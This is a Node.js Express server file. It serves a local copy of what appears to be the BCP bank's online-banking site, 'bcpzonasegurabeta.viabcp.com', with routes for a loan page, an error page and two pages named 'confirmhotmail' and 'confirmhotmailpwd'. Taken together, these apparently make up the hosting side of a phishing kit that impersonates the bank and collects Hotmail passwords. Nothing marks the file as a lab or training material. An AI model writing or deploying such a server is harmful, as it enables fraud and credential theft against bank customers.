const express = require('express');
const app = express();
const path = require('path');
const router = express.Router();

//const cspDefaults = helmet.contentSecurityPolicy.getDefaultDirectives();
//delete cspDefaults['upgrade-insecure-requests'];

//app.use(helmet({
//  contentSecurityPolicy: { directives: cspDefaults }
//}));



app.use('/static', express.static(__dirname + '/bcpzonasegurabeta.viabcp.com/static'));
app.use('/assets', express.static(__dirname + '/bcpzonasegurabeta.viabcp.com/assets'));
app.get('/',function(req,res) {
    res.sendFile(path.join(__dirname+'/bcpzonasegurabeta.viabcp.com/test1.html'));
  });

app.get('/error',function(req,res) {
    res.sendFile(path.join(__dirname+'/bcpzonasegurabeta.viabcp.com/error.html'));
  }); 

app.get('/prestamo',function(req,res) {
    res.sendFile(path.join(__dirname+'/bcpzonasegurabeta.viabcp.com/prestamo.html'));
  });   

app.get('/confirmhotmail',function(req,res) {
    res.sendFile(path.join(__dirname+'/bcpzonasegurabeta.viabcp.com/confirmhotmail.html'));
  });  

app.get('/confirmhotmailpwd',function(req,res) {
    res.sendFile(path.join(__dirname+'/bcpzonasegurabeta.viabcp.com/confirmhotmailpwd.html'));
  });   

 
// Start the server
// for deploy host is: 0.0.0.0 
// for local test is: 192.168.0.7
const PORT = process.env.PORT || 8080;
app.listen(PORT, '0.0.0.0 ', () => {
  console.log(`App listening on port ${PORT}`);
  console.log('Press Ctrl+C to quit.');
});